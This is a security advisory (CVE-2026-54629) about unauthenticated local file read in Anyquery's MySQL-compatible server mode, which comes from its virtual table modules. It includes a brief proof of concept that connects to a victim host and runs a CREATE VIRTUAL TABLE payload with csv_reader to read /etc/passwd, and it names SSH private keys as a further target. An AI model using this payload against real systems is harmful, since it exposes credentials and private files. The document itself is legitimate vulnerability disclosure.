# [H] Anyquery: Local File Read (LFR) via Unrestricted SQLite Virtual Table Modules in Server Mode

## Summary
Severity: High
Advisory: GHSA-mf78-3rpf-r784
CVE: CVE-2026-54629
CWE: CWE-22, CWE-284, CWE-552, CWE-73, CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-14
Source: https://github.com/advisories/GHSA-mf78-3rpf-r784
Type: github-advisory

## Affected
- Go: `github.com/julien040/anyquery` — affected >=0

## Details
## Summary
Anyquery's `server` mode lacks input sanitization and access control over its built-in SQLite virtual table modules (e.g., `csv_reader`, `log_reader`). Unauthenticated attackers connecting to the MySQL-compatible server port can create virtual tables pointing to local files on the system (e.g., `/etc/passwd`, `~/.ssh/id_rsa`). This allows full Local File Read (LFR) capabilities, compromising sensitive system configurations and credentials.

## Details
Anyquery utilizes the `hashicorp/go-getter` library within its data ingestion modules. When Anyquery is launched in **Server Mode** (`anyquery server`), it binds to a TCP port and accepts MySQL protocol connections. The server handler does not restrict the usage of these virtual table modules to safe directories. An attacker can connect to the server and execute native SQLite virtual table creation queries to instantiate modules like `csv_reader` pointing to restricted files. Because the file read operation is initiated by the Anyquery server process, the attacker can read any file the process has access to.

## PoC (Proof of Concept)
1. Start the server on the victim machine:
   ```bash
   anyquery server --host 0.0.0.0 --port 8070
   ```
2. Connect from an attacker machine:
   ```bash
   mysql -u root -h <VICTIM_IP> -P 8070
   ```
3. Execute the following payload to read `/etc/passwd`:
   ```sql
   CREATE VIRTUAL TABLE passwd USING csv_reader('/etc/passwd');
   SELECT * FROM passwd;
   ```

## Impact
- **Confidentiality:** High. Complete compromise of local file system confidentiality.
- **Integrity:** None.
- **Availability:** None.
- **CVSS Score:** 7.5 (High) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

## Remediation
Implement a sandboxing mechanism in Server Mode (e.g., a `--restrict-paths` flag) to limit `read_*` operations to designated directories.

## References
- https://github.com/julien040/anyquery/security/advisories/GHSA-mf78-3rpf-r784
- https://github.com/julien040/anyquery
- https://github.com/julien040/anyquery/releases/tag/0.4.5
